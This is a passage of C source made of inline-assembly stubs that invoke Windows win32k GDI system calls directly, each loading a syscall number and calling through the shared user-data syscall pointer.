    __asm {
        mov eax, 00001058h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdRenderMoComp()
{
    __asm {
        mov eax, 00001059h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdResetVisrgn()
{
    __asm {
        mov eax, 0000105Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetColorKey()
{
    __asm {
        mov eax, 0000105Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetExclusiveMode()
{
    __asm {
        mov eax, 0000105Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetGammaRamp()
{
    __asm {
        mov eax, 0000105Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateSurfaceEx()
{
    __asm {
        mov eax, 0000105Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdSetOverlayPosition()
{
    __asm {
        mov eax, 0000105Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUnattachSurface()
{
    __asm {
        mov eax, 00001060h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUnlock()
{
    __asm {
        mov eax, 00001061h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUnlockD3D()
{
    __asm {
        mov eax, 00001062h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdUpdateOverlay()
{
    __asm {
        mov eax, 00001063h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdWaitForVerticalBlank()
{
    __asm {
        mov eax, 00001064h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpCanCreateVideoPort()
{
    __asm {
        mov eax, 00001065h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpColorControl()
{
    __asm {
        mov eax, 00001066h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpCreateVideoPort()
{
    __asm {
        mov eax, 00001067h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpDestroyVideoPort()
{
    __asm {
        mov eax, 00001068h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpFlipVideoPort()
{
    __asm {
        mov eax, 00001069h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortBandwidth()
{
    __asm {
        mov eax, 0000106Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortField()
{
    __asm {
        mov eax, 0000106Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortFlipStatus()
{
    __asm {
        mov eax, 0000106Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortInputFormats()
{
    __asm {
        mov eax, 0000106Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortLine()
{
    __asm {
        mov eax, 0000106Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortOutputFormats()
{
    __asm {
        mov eax, 0000106Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoPortConnectInfo()
{
    __asm {
        mov eax, 00001070h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpGetVideoSignalStatus()
{
    __asm {
        mov eax, 00001071h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpUpdateVideoPort()
{
    __asm {
        mov eax, 00001072h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpWaitForVideoPortSync()
{
    __asm {
        mov eax, 00001073h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpAcquireNotification()
{
    __asm {
        mov eax, 00001074h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDvpReleaseNotification()
{
    __asm {
        mov eax, 00001075h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDxgGenericThunk()
{
    __asm {
        mov eax, 00001076h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteClientObj()
{
    __asm {
        mov eax, 00001077h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteColorSpace()
{
    __asm {
        mov eax, 00001078h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteColorTransform()
{
    __asm {
        mov eax, 00001079h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDeleteObjectApp()
{
    __asm {
        mov eax, 0000107Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDescribePixelFormat()
{
    __asm {
        mov eax, 0000107Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetPerBandInfo()
{
    __asm {
        mov eax, 0000107Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDoBanding()
{
    __asm {
        mov eax, 0000107Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDoPalette()
{
    __asm {
        mov eax, 0000107Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDrawEscape()
{
    __asm {
        mov eax, 0000107Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEllipse()
{
    __asm {
        mov eax, 00001080h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnableEudc()
{
    __asm {
        mov eax, 00001081h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEndDoc()
{
    __asm {
        mov eax, 00001082h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEndPage()
{
    __asm {
        mov eax, 00001083h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEndPath()
{
    __asm {
        mov eax, 00001084h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumFontChunk()
{
    __asm {
        mov eax, 00001085h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumFontClose()
{
    __asm {
        mov eax, 00001086h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumFontOpen()
{
    __asm {
        mov eax, 00001087h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiEnumObjects()
{
    __asm {
        mov eax, 00001088h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEqualRgn()
{
    __asm {
        mov eax, 00001089h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEudcLoadUnloadLink()
{
    __asm {
        mov eax, 0000108Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExcludeClipRect()
{
    __asm {
        mov eax, 0000108Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtCreatePen()
{
    __asm {
        mov eax, 0000108Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtCreateRegion()
{
    __asm {
        mov eax, 0000108Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtEscape()
{
    __asm {
        mov eax, 0000108Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtFloodFill()
{
    __asm {
        mov eax, 0000108Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtGetObjectW()
{
    __asm {
        mov eax, 00001090h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtSelectClipRgn()
{
    __asm {
        mov eax, 00001091h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiExtTextOutW()
{
    __asm {
        mov eax, 00001092h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFillPath()
{
    __asm {
        mov eax, 00001093h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFillRgn()
{
    __asm {
        mov eax, 00001094h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiFlattenPath()
{
    __asm {
        mov eax, 00001095h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFlush()
{
    __asm {
        mov eax, 00001096h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiForceUFIMapping()
{
    __asm {
        mov eax, 00001097h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFrameRgn()
{
    __asm {
        mov eax, 00001098h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFullscreenControl()
{
    __asm {
        mov eax, 00001099h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetAndSetDCDword()
{
    __asm {
        mov eax, 0000109Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetAppClipBox()
{
    __asm {
        mov eax, 0000109Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetBitmapBits()
{
    __asm {
        mov eax, 0000109Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetBitmapDimension()
{
    __asm {
        mov eax, 0000109Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetBoundsRect()
{
    __asm {
        mov eax, 0000109Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharABCWidthsW()
{
    __asm {
        mov eax, 0000109Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharacterPlacementW()
{
    __asm {
        mov eax, 000010A0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharSet()
{
    __asm {
        mov eax, 000010A1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharWidthW()
{
    __asm {
        mov eax, 000010A2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetCharWidthInfo()
{
    __asm {
        mov eax, 000010A3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetColorAdjustment()
{
    __asm {
        mov eax, 000010A4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetColorSpaceforBitmap()
{
    __asm {
        mov eax, 000010A5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCDword()
{
    __asm {
        mov eax, 000010A6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCforBitmap()
{
    __asm {
        mov eax, 000010A7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCObject()
{
    __asm {
        mov eax, 000010A8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDCPoint()
{
    __asm {
        mov eax, 000010A9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceCaps()
{
    __asm {
        mov eax, 000010AAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceGammaRamp()
{
    __asm {
        mov eax, 000010ABh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDeviceCapsAll()
{
    __asm {
        mov eax, 000010ACh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDIBitsInternal()
{
    __asm {
        mov eax, 000010ADh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetETM()
{
    __asm {
        mov eax, 000010AEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetEudcTimeStampEx()
{
    __asm {
        mov eax, 000010AFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontData()
{
    __asm {
        mov eax, 000010B0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontResourceInfoInternalW()
{
    __asm {
        mov eax, 000010B1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetGlyphIndicesW()
{
    __asm {
        mov eax, 000010B2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetGlyphIndicesWInternal()
{
    __asm {
        mov eax, 000010B3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetGlyphOutline()
{
    __asm {
        mov eax, 000010B4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetKerningPairs()
{
    __asm {
        mov eax, 000010B5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetLinkedUFIs()
{
    __asm {
        mov eax, 000010B6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetMiterLimit()
{
    __asm {
        mov eax, 000010B7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetMonitorID()
{
    __asm {
        mov eax, 000010B8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetNearestColor()
{
    __asm {
        mov eax, 000010B9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetNearestPaletteIndex()
{
    __asm {
        mov eax, 000010BAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetObjectBitmapHandle()
{
    __asm {
        mov eax, 000010BBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetOutlineTextMetricsInternalW()
{
    __asm {
        mov eax, 000010BCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetPath()
{
    __asm {
        mov eax, 000010BDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetPixel()
{
    __asm {
        mov eax, 000010BEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRandomRgn()
{
    __asm {
        mov eax, 000010BFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRasterizerCaps()
{
    __asm {
        mov eax, 000010C0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRealizationInfo()
{
    __asm {
        mov eax, 000010C1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRegionData()
{
    __asm {
        mov eax, 000010C2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetRgnBox()
{
    __asm {
        mov eax, 000010C3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetServerMetaFileBits()
{
    __asm {
        mov eax, 000010C4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetSpoolMessage()
{
    __asm {
        mov eax, 000010C5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetStats()
{
    __asm {
        mov eax, 000010C6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetStockObject()
{
    __asm {
        mov eax, 000010C7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetStringBitmapW()
{
    __asm {
        mov eax, 000010C8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetSystemPaletteUse()
{
    __asm {
        mov eax, 000010C9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextCharsetInfo()
{
    __asm {
        mov eax, 000010CAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextExtent()
{
    __asm {
        mov eax, 000010CBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextExtentExW()
{
    __asm {
        mov eax, 000010CCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextFaceW()
{
    __asm {
        mov eax, 000010CDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTextMetricsW()
{
    __asm {
        mov eax, 000010CEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetTransform()
{
    __asm {
        mov eax, 000010CFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetUFI()
{
    __asm {
        mov eax, 000010D0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetEmbUFI()
{
    __asm {
        mov eax, 000010D1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetUFIPathname()
{
    __asm {
        mov eax, 000010D2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetEmbedFonts()
{
    __asm {
        mov eax, 000010D3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiChangeGhostFont()
{
    __asm {
        mov eax, 000010D4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddEmbFontToDC()
{
    __asm {
        mov eax, 000010D5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontUnicodeRanges()
{
    __asm {
        mov eax, 000010D6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetWidthTable()
{
    __asm {
        mov eax, 000010D7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGradientFill()
{
    __asm {
        mov eax, 000010D8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiHfontCreate()
{
    __asm {
        mov eax, 000010D9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiIcmBrushInfo()
{
    __asm {
        mov eax, 000010DAh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiInit()
{
    __asm {
        mov eax, 000010DBh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiInitSpool()
{
    __asm {
        mov eax, 000010DCh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiIntersectClipRect()
{
    __asm {
        mov eax, 000010DDh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiInvertRgn()
{
    __asm {
        mov eax, 000010DEh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiLineTo()
{
    __asm {
        mov eax, 000010DFh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiMakeFontDir()
{
    __asm {
        mov eax, 000010E0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMakeInfoDC()
{
    __asm {
        mov eax, 000010E1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMaskBlt()
{
    __asm {
        mov eax, 000010E2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000034h
    }
}

__declspec(naked) ULONG NTAPI NtGdiModifyWorldTransform()
{
    __asm {
        mov eax, 000010E3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiMonoBitmap()
{
    __asm {
        mov eax, 000010E4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiMoveTo()
{
    __asm {
        mov eax, 000010E5h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetClipRgn()
{
    __asm {
        mov eax, 000010E6h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetRgn()
{
    __asm {
        mov eax, 000010E7h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiOpenDCW()
{
    __asm {
        mov eax, 000010E8h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiPatBlt()
{
    __asm {
        mov eax, 000010E9h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

